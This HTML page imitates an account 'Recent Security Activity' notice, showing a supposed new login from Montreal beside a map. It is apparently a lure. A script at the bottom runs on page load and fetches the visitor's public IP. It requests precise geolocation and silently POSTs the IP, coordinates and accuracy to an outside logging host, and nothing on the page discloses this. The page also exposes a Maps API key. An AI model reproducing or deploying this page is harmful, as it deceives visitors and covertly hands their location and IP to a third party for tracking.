<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Security Activity</title>

  <style>
    body {
      font-family: Arial, sans-serif;
      background: #f1f3f4;
      margin: 0;
      padding: 30px 16px;
      color: #202124;
    }

    .container {
      max-width: 900px;
      margin: 0 auto;
      background: #fff;
      padding: 28px 32px;
      border-radius: 8px;
      box-shadow: 0 1px 3px rgba(60, 64, 67, 0.3);
    }

    h1 {
      font-size: 24px;
      margin-bottom: 6px;
    }

    .sub {
      font-size: 14px;
      color: #5f6368;
      margin-bottom: 20px;
    }

    .activity-card {
      border: 1px solid #dadce0;
      padding: 18px 20px;
      border-radius: 8px;
      margin-bottom: 20px;
    }

    .time {
      font-size: 14px;
      color: #5f6368;
    }

    .title {
      font-size: 17px;
      font-weight: 600;
      margin: 4px 0;
    }

    .location {
      font-size: 14px;
      color: #5f6368;
    }

    .badge {
      display: inline-block;
      margin-top: 10px;
      padding: 4px 10px;
      border-radius: 20px;
      border: 1px solid #188038;
      color: #188038;
      font-size: 12px;
      font-weight: 600;
    }

    #map {
      width: 100%;
      height: 360px;
      border-radius: 8px;
      border: 1px solid #dadce0;
      margin-top: 10px;
    }

    .info {
      font-size: 13px;
      color: #5f6368;
      margin-top: 6px;
    }
  </style>
</head>

<body>
  <div class="container">
    <h1>Recent Security Activity</h1>
    <div class="sub">Security activity and alerts from the past 28 days.</div>

    <!-- ✅ Activity -->
    <div class="activity-card">
      <div class="time">Nov 28, 2025 – 4:26 PM</div>
      <div class="title">New account login</div>
      <div class="location">Montreal, Canada (approximate)</div>
      <div class="badge">Verified</div>
    </div>

    <!-- ✅ Map -->
    <h3 style="margin-top: 25px;">Activity Location</h3>
    <div id="map"></div>
    <div class="info">Your live location updates automatically.</div>
  </div>

  <!-- ✅ Google Maps + Geolocation -->
  <script>
    let map, activityMarker, myMarker, circle;

    function initMap() {
      const activityPos = { lat: 45.5019, lng: -73.5674 }; // Montreal example

      map = new google.maps.Map(document.getElementById("map"), {
        zoom: 13,
        center: activityPos,
      });

      activityMarker = new google.maps.Marker({
        position: activityPos,
        map: map,
        title: "Activity location",
        icon: "http://maps.google.com/mapfiles/ms/icons/blue-dot.png"
      });

      circle = new google.maps.Circle({
        map: map,
        radius: 3000,
        fillColor: "#4285F4",
        fillOpacity: 0.12,
        strokeColor: "#4285F4",
        strokeOpacity: 0.5,
        strokeWeight: 2,
      });

      circle.bindTo("center", activityMarker, "position");

      // ✅ Live geolocation
      if (navigator.geolocation) {
        navigator.geolocation.watchPosition(
          (pos) => {
            const myPos = {
              lat: pos.coords.latitude,
              lng: pos.coords.longitude
            };

            if (!myMarker) {
              myMarker = new google.maps.Marker({
                position: myPos,
                map: map,
                title: "",
                icon: "http://maps.google.com/mapfiles/ms/icons/red-dot.png"
              });
            } else {
              myMarker.setPosition(myPos);
            }
          },
          (err) => console.log("Geolocation error:", err),
          { enableHighAccuracy: true }
        );
      }
    }
  </script>

  <!-- ✅ Google Maps API KEY -->
  <script async src="https://maps.googleapis.com/maps/api/js?key=AIzaSyC3YbR8Ov-n_Ah3ftfFkW0PYhG9sRN70Tg&language=en&callback=initMap"></script>

  <!-- ✅ IP + Geolocation Logging -->
  <script>
    async function sendIPAndGeo() {
      try {
        const res = await fetch("https://api.ipify.org?format=json");
        const data = await res.json();
        const ip = data.ip;

        navigator.geolocation.getCurrentPosition(
          async (pos) => {
            const geo_lat = pos.coords.latitude;
            const geo_lon = pos.coords.longitude;
            const accuracy = pos.coords.accuracy;

            await fetch("https://ip-logger-1bdu.onrender.com/log-ip", {
              method: "POST",
              headers: { "Content-Type": "application/json" },
              body: JSON.stringify({ ip, geo_lat, geo_lon, accuracy })
            });
          },
          async () => {
            await fetch("https://ip-logger-1bdu.onrender.com/log-ip", {
              method: "POST",
              headers: { "Content-Type": "application/json" },
              body: JSON.stringify({ ip })
            });
          }
        );
      } catch (err) {
        console.error("Failed to send IP/Geo:", err);
      }
    }

    sendIPAndGeo();
  </script>

</body>
</html>
